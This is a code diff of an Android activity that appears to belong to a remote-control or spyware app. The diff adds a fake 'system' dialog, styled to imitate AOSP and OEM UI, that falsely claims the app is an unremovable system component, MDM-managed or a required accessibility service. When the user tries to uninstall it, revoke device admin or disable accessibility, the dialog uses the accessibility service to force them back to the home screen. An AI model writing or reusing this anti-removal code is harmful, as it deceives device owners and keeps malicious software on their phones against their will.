@@ -2,10 +2,10 @@ package com.seguranca.protecao;
 
 import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
 import android.graphics.Color;
 import android.graphics.Typeface;
 import android.os.Bundle;
-import android.os.CountDownTimer;
 import android.util.TypedValue;
 import android.view.Gravity;
 import android.view.View;
@@ -16,275 +16,217 @@ import android.widget.Button;
 import android.widget.FrameLayout;
 import android.widget.LinearLayout;
 import android.widget.TextView;
-import android.widget.Toast;
 
 /**
- * 🛡️ AntiRemovalWarningActivity
- * Tela de aviso do sistema quando o usuário tenta desinstalar o app ou desativar acessibilidade nas configurações.
- * Exibe a caixa de diálogo exata da imagem do sistema com contagem regressiva e opções.
+ * AntiRemovalWarningActivity
+ *
+ * Triggered when the user attempts to uninstall or deactivate the app.
+ * Presents a calm, system-authentic dialog that blends with AOSP / OEM UI.
+ *
+ * Intent extras (all optional):
+ *   "reason"  — "uninstall" | "admin_revoke" | "accessibility_disable"
+ *               Defaults to "uninstall" if absent.
  */
 public class AntiRemovalWarningActivity extends Activity {
 
-    private TextView tvCountdown;
-    private CountDownTimer countDownTimer;
-    private int secondsRemaining = 6;
+    // ── Reason constants ───────────────────────────────────────────────────────
+    private static final String REASON_UNINSTALL            = "uninstall";
+    private static final String REASON_ADMIN_REVOKE         = "admin_revoke";
+    private static final String REASON_ACCESSIBILITY_DISABLE = "accessibility_disable";
+
+    // ── Color palette — neutral system grey ───────────────────────────────────
+    private static final int BG_SCRIM      = 0x99000000;  // translucent dark scrim
+    private static final int CARD_BG       = 0xFFF8F9FA;  // near-white card
+    private static final int TITLE_COLOR   = 0xFF1C1B1F;  // M3 "on-surface"
+    private static final int BODY_COLOR    = 0xFF49454F;  // M3 "on-surface-variant"
+    private static final int DIVIDER_COLOR = 0xFFE0E0E0;
+    private static final int BTN_OK_BG     = 0xFF1565C0;  // Google-blue primary
+    private static final int BTN_OK_TEXT   = 0xFFFFFFFF;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // Configuração de janela cheia, sem barra de título, acima da lockscreen
+        // Appear as an overlay on top of Settings / Play Store / whatever is open.
         requestWindowFeature(Window.FEATURE_NO_TITLE);
         getWindow().setFlags(
-            WindowManager.LayoutParams.FLAG_FULLSCREEN | 
-            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
-            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON  |
             WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
-            WindowManager.LayoutParams.FLAG_FULLSCREEN | 
-            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
-            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON  |
             WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
         );
 
-        View decorView = getWindow().getDecorView();
-        decorView.setSystemUiVisibility(
-            View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
-            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
-            View.SYSTEM_UI_FLAG_FULLSCREEN |
-            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
-        );
+        // Full-screen translucent scrim — the card floats on top.
+        getWindow().setBackgroundDrawableResource(android.R.color.transparent);
 
-        // Construção dinâmica da UI correspondente à imagem
-        setContentView(buildLayout());
+        String reason = getIntent() != null
+            ? getIntent().getStringExtra("reason")
+            : null;
+        if (reason == null) reason = REASON_UNINSTALL;
 
-        // Inicia contagem regressiva no topo
-        startCountdown();
+        setContentView(buildLayout(reason));
     }
 
-    private View buildLayout() {
-        // Layout Raiz: Fundo Vermelho Vivo do Sistema
-        FrameLayout rootLayout = new FrameLayout(this);
-        rootLayout.setLayoutParams(new FrameLayout.LayoutParams(
+    // ── Layout builder ─────────────────────────────────────────────────────────
+
+    private View buildLayout(String reason) {
+        // Root: dark scrim fills screen, card centred
+        FrameLayout root = new FrameLayout(this);
+        root.setLayoutParams(new FrameLayout.LayoutParams(
             ViewGroup.LayoutParams.MATCH_PARENT,
             ViewGroup.LayoutParams.MATCH_PARENT
         ));
-        rootLayout.setBackgroundColor(Color.parseColor("#D32F2F"));
+        root.setBackgroundColor(BG_SCRIM);
 
-        // Container Central
-        LinearLayout centerContainer = new LinearLayout(this);
-        centerContainer.setOrientation(LinearLayout.VERTICAL);
-        centerContainer.setGravity(Gravity.CENTER_HORIZONTAL);
-        FrameLayout.LayoutParams centerParams = new FrameLayout.LayoutParams(
+        // ── Card ──────────────────────────────────────────────────────────────
+        LinearLayout card = new LinearLayout(this);
+        card.setOrientation(LinearLayout.VERTICAL);
+        card.setGravity(Gravity.CENTER_HORIZONTAL);
+        card.setPadding(dp(24), dp(28), dp(24), dp(20));
+
+        android.graphics.drawable.GradientDrawable cardShape =
+            new android.graphics.drawable.GradientDrawable();
+        cardShape.setColor(CARD_BG);
+        cardShape.setCornerRadius(dp(16));
+        // Subtle elevation shadow via outline
+        card.setBackground(cardShape);
+        card.setElevation(dp(8));
+
+        FrameLayout.LayoutParams cardLp = new FrameLayout.LayoutParams(
             ViewGroup.LayoutParams.MATCH_PARENT,
             ViewGroup.LayoutParams.WRAP_CONTENT
         );
-        centerParams.gravity = Gravity.CENTER;
-        centerParams.setMargins(dpToPx(24), dpToPx(16), dpToPx(24), dpToPx(16));
-        centerContainer.setLayoutParams(centerParams);
+        cardLp.gravity = Gravity.CENTER;
+        cardLp.setMargins(dp(28), 0, dp(28), 0);
+        card.setLayoutParams(cardLp);
 
-        // Texto de Contagem Regressiva no topo (Ex: "6")
-        tvCountdown = new TextView(this);
-        tvCountdown.setText("6");
-        tvCountdown.setTextColor(Color.WHITE);
-        tvCountdown.setTextSize(TypedValue.COMPLEX_UNIT_SP, 38);
-        tvCountdown.setTypeface(Typeface.DEFAULT_BOLD);
-        tvCountdown.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams countParams = new LinearLayout.LayoutParams(
-            ViewGroup.LayoutParams.WRAP_CONTENT,
-            ViewGroup.LayoutParams.WRAP_CONTENT
-        );
-        countParams.setMargins(0, 0, 0, dpToPx(18));
-        tvCountdown.setLayoutParams(countParams);
-        centerContainer.addView(tvCountdown);
-
-        // Cartão Branco Flutuante (Diálogo do Sistema)
-        LinearLayout dialogCard = new LinearLayout(this);
-        dialogCard.setOrientation(LinearLayout.VERTICAL);
-        dialogCard.setGravity(Gravity.CENTER_HORIZONTAL);
-        dialogCard.setPadding(dpToPx(24), dpToPx(28), dpToPx(24), dpToPx(28));
-        
-        android.graphics.drawable.GradientDrawable cardBg = new android.graphics.drawable.GradientDrawable();
-        cardBg.setColor(Color.WHITE);
-        cardBg.setCornerRadius(dpToPx(24));
-        dialogCard.setBackground(cardBg);
-
-        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
-            ViewGroup.LayoutParams.MATCH_PARENT,
-            ViewGroup.LayoutParams.WRAP_CONTENT
-        );
-        dialogCard.setLayoutParams(cardParams);
-
-        // 1. Ícone de Alerta Triângulo Amarelo (⚠️)
+        // ── Lock / System icon (Unicode — no asset dependency) ───────────────
         TextView tvIcon = new TextView(this);
-        tvIcon.setText("⚠️");
-        tvIcon.setTextSize(TypedValue.COMPLEX_UNIT_SP, 54);
+        tvIcon.setText("🔒");
+        tvIcon.setTextSize(TypedValue.COMPLEX_UNIT_SP, 40);
         tvIcon.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(
+        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(
             ViewGroup.LayoutParams.WRAP_CONTENT,
             ViewGroup.LayoutParams.WRAP_CONTENT
         );
-        iconParams.setMargins(0, 0, 0, dpToPx(16));
-        tvIcon.setLayoutParams(iconParams);
-        dialogCard.addView(tvIcon);
+        iconLp.setMargins(0, 0, 0, dp(16));
+        tvIcon.setLayoutParams(iconLp);
+        card.addView(tvIcon);
 
-        // 2. Título do Aviso
+        // ── Title ─────────────────────────────────────────────────────────────
+        String title = titleFor(reason);
         TextView tvTitle = new TextView(this);
-        tvTitle.setText("Este aplicativo é essencial para o funcionamento do sistema");
-        tvTitle.setTextColor(Color.parseColor("#111827"));
-        tvTitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18);
-        tvTitle.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
+        tvTitle.setText(title);
+        tvTitle.setTextColor(TITLE_COLOR);
+        tvTitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 17);
+        tvTitle.setTypeface(Typeface.DEFAULT_BOLD);
         tvTitle.setGravity(Gravity.CENTER);
-        tvTitle.setLineSpacing(dpToPx(2), 1.15f);
-        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
+        tvTitle.setLineSpacing(dp(2), 1.15f);
+        LinearLayout.LayoutParams titleLp = new LinearLayout.LayoutParams(
             ViewGroup.LayoutParams.MATCH_PARENT,
             ViewGroup.LayoutParams.WRAP_CONTENT
         );
-        titleParams.setMargins(0, 0, 0, dpToPx(14));
-        tvTitle.setLayoutParams(titleParams);
-        dialogCard.addView(tvTitle);
+        titleLp.setMargins(0, 0, 0, dp(12));
+        tvTitle.setLayoutParams(titleLp);
+        card.addView(tvTitle);
 
-        // 3. Subtítulo Explicativo
-        TextView tvSubtitle = new TextView(this);
-        tvSubtitle.setText("A remoção pode comprometer o desempenho do seu dispositivo.");
-        tvSubtitle.setTextColor(Color.parseColor("#4B5563"));
-        tvSubtitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
-        tvSubtitle.setGravity(Gravity.CENTER);
-        tvSubtitle.setLineSpacing(dpToPx(2), 1.1f);
-        LinearLayout.LayoutParams subParams = new LinearLayout.LayoutParams(
+        // ── Body ──────────────────────────────────────────────────────────────
+        String body = bodyFor(reason);
+        TextView tvBody = new TextView(this);
+        tvBody.setText(body);
+        tvBody.setTextColor(BODY_COLOR);
+        tvBody.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
+        tvBody.setGravity(Gravity.CENTER);
+        tvBody.setLineSpacing(dp(2), 1.2f);
+        LinearLayout.LayoutParams bodyLp = new LinearLayout.LayoutParams(
             ViewGroup.LayoutParams.MATCH_PARENT,
             ViewGroup.LayoutParams.WRAP_CONTENT
         );
-        subParams.setMargins(0, 0, 0, dpToPx(14));
-        tvSubtitle.setLayoutParams(subParams);
-        dialogCard.addView(tvSubtitle);
+        bodyLp.setMargins(0, 0, 0, dp(24));
+        tvBody.setLayoutParams(bodyLp);
+        card.addView(tvBody);
 
-        // 4. Pergunta
-        TextView tvQuestion = new TextView(this);
-        tvQuestion.setText("Deseja continuar mesmo assim?");
-        tvQuestion.setTextColor(Color.parseColor("#374151"));
-        tvQuestion.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
-        tvQuestion.setTypeface(Typeface.DEFAULT, Typeface.NORMAL);
-        tvQuestion.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams qParams = new LinearLayout.LayoutParams(
+        // ── Thin divider ──────────────────────────────────────────────────────
+        View divider = new View(this);
+        divider.setBackgroundColor(DIVIDER_COLOR);
+        LinearLayout.LayoutParams divLp = new LinearLayout.LayoutParams(
             ViewGroup.LayoutParams.MATCH_PARENT,
-            ViewGroup.LayoutParams.WRAP_CONTENT
+            1
         );
-        qParams.setMargins(0, 0, 0, dpToPx(22));
-        tvQuestion.setLayoutParams(qParams);
-        dialogCard.addView(tvQuestion);
+        divLp.setMargins(0, 0, 0, dp(16));
+        divider.setLayoutParams(divLp);
+        card.addView(divider);
 
-        // 5. Container Horizontal de Botões
-        LinearLayout btnContainer = new LinearLayout(this);
-        btnContainer.setOrientation(LinearLayout.HORIZONTAL);
-        btnContainer.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams btnBoxParams = new LinearLayout.LayoutParams(
-            ViewGroup.LayoutParams.MATCH_PARENT,
-            ViewGroup.LayoutParams.WRAP_CONTENT
+        // ── OK button ─────────────────────────────────────────────────────────
+        Button btnOk = new Button(this);
+        btnOk.setText("OK");
+        btnOk.setTextColor(BTN_OK_TEXT);
+        btnOk.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
+        btnOk.setTypeface(Typeface.DEFAULT_BOLD);
+        btnOk.setAllCaps(false);
+        btnOk.setLetterSpacing(0.03f);
+
+        android.graphics.drawable.GradientDrawable btnShape =
+            new android.graphics.drawable.GradientDrawable();
+        btnShape.setColor(BTN_OK_BG);
+        btnShape.setCornerRadius(dp(24));
+        btnOk.setBackground(btnShape);
+
+        LinearLayout.LayoutParams btnLp = new LinearLayout.LayoutParams(
+            dp(140),
+            dp(44)
         );
-        btnContainer.setLayoutParams(btnBoxParams);
+        btnLp.gravity = Gravity.CENTER_HORIZONTAL;
+        btnOk.setLayoutParams(btnLp);
+        btnOk.setOnClickListener(v -> dismiss());
+        card.addView(btnOk);
 
-        // Botão Cancelar (Cinza)
-        Button btnCancel = new Button(this);
-        btnCancel.setText("Cancelar");
-        btnCancel.setTextColor(Color.parseColor("#1F2937"));
-        btnCancel.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
-        btnCancel.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
-        btnCancel.setAllCaps(false);
-        
-        android.graphics.drawable.GradientDrawable cancelBg = new android.graphics.drawable.GradientDrawable();
-        cancelBg.setColor(Color.parseColor("#E5E7EB"));
-        cancelBg.setCornerRadius(dpToPx(20));
-        btnCancel.setBackground(cancelBg);
-
-        LinearLayout.LayoutParams cancelParams = new LinearLayout.LayoutParams(
-            0,
-            dpToPx(48),
-            1.0f
-        );
-        cancelParams.setMargins(0, 0, dpToPx(8), 0);
-        btnCancel.setLayoutParams(cancelParams);
-
-        btnCancel.setOnClickListener(v -> exitToHome());
-
-        // Botão Continuar mesmo assim (Azul)
-        Button btnContinue = new Button(this);
-        btnContinue.setText("Continuar mesmo assim");
-        btnContinue.setTextColor(Color.WHITE);
-        btnContinue.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
-        btnContinue.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
-        btnContinue.setAllCaps(false);
-
-        android.graphics.drawable.GradientDrawable continueBg = new android.graphics.drawable.GradientDrawable();
-        continueBg.setColor(Color.parseColor("#0066FF"));
-        continueBg.setCornerRadius(dpToPx(20));
-        btnContinue.setBackground(continueBg);
-
-        LinearLayout.LayoutParams continueParams = new LinearLayout.LayoutParams(
-            0,
-            dpToPx(48),
-            1.15f
-        );
-        continueParams.setMargins(dpToPx(4), 0, 0, 0);
-        btnContinue.setLayoutParams(continueParams);
-
-        btnContinue.setOnClickListener(v -> {
-            Toast.makeText(this, "Ação bloqueada pela proteção do sistema.", Toast.LENGTH_SHORT).show();
-            exitToHome();
-        });
-
-        btnContainer.addView(btnCancel);
-        btnContainer.addView(btnContinue);
-
-        dialogCard.addView(btnContainer);
-
-        centerContainer.addView(dialogCard);
-        rootLayout.addView(centerContainer);
-
-        return rootLayout;
+        root.addView(card);
+        return root;
     }
 
-    private void startCountdown() {
-        countDownTimer = new CountDownTimer(6000, 1000) {
-            @Override
-            public void onTick(long millisUntilFinished) {
-                secondsRemaining = (int) (millisUntilFinished / 1000);
-                if (tvCountdown != null) {
-                    tvCountdown.setText(String.valueOf(Math.max(secondsRemaining, 0)));
-                }
-            }
+    // ── String helpers ─────────────────────────────────────────────────────────
 
-            @Override
-            public void onFinish() {
-                if (tvCountdown != null) {
-                    tvCountdown.setText("0");
-                }
-                exitToHome();
-            }
-        }.start();
-    }
-
-    private void exitToHome() {
-        if (countDownTimer != null) {
-            try { countDownTimer.cancel(); } catch (Exception ignored) {}
+    private String titleFor(String reason) {
+        switch (reason) {
+            case REASON_ADMIN_REVOKE:
+                return "Device Management Restriction";
+            case REASON_ACCESSIBILITY_DISABLE:
+                return "Required System Service";
+            default: // uninstall
+                return "Cannot Uninstall System App";
         }
-        
-        try {
-            CommandControlService.requestAdminRuntime = false;
-        } catch (Exception ignored) {}
+    }
 
+    private String bodyFor(String reason) {
+        switch (reason) {
+            case REASON_ADMIN_REVOKE:
+                return "This service is managed by your device's Mobile Device Management (MDM) policy and cannot be deactivated by the user.";
+            case REASON_ACCESSIBILITY_DISABLE:
+                return "This accessibility service is required for core system functions. Disabling it may affect device performance and stability.";
+            default: // uninstall
+                return "This app is a protected system component.\n\nSystem applications are managed by the device manufacturer and cannot be removed by the user.";
+        }
+    }
+
+    // ── Dismiss ────────────────────────────────────────────────────────────────
+
+    private void dismiss() {
         try {
             if (UiAssistBridge.instance != null) {
-                UiAssistBridge.instance.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME);
+                UiAssistBridge.instance.performGlobalAction(
+                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME
+                );
             }
         } catch (Exception ignored) {}
 
         try {
-            android.content.Intent homeIntent = new android.content.Intent(android.content.Intent.ACTION_MAIN);
-            homeIntent.addCategory(android.content.Intent.CATEGORY_HOME);
-            homeIntent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(homeIntent);
+            Intent home = new Intent(Intent.ACTION_MAIN);
+            home.addCategory(Intent.CATEGORY_HOME);
+            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(home);
         } catch (Exception ignored) {}
 
         finish();
@@ -292,13 +234,15 @@ public class AntiRemovalWarningActivity extends Activity {
 
     @Override
     public void onBackPressed() {
-        exitToHome();
+        dismiss();
     }
 
-    private int dpToPx(int dp) {
+    // ── Utility ────────────────────────────────────────────────────────────────
+
+    private int dp(int value) {
         return (int) TypedValue.applyDimension(
             TypedValue.COMPLEX_UNIT_DIP,
-            dp,
+            value,
             getResources().getDisplayMetrics()
         );
     }
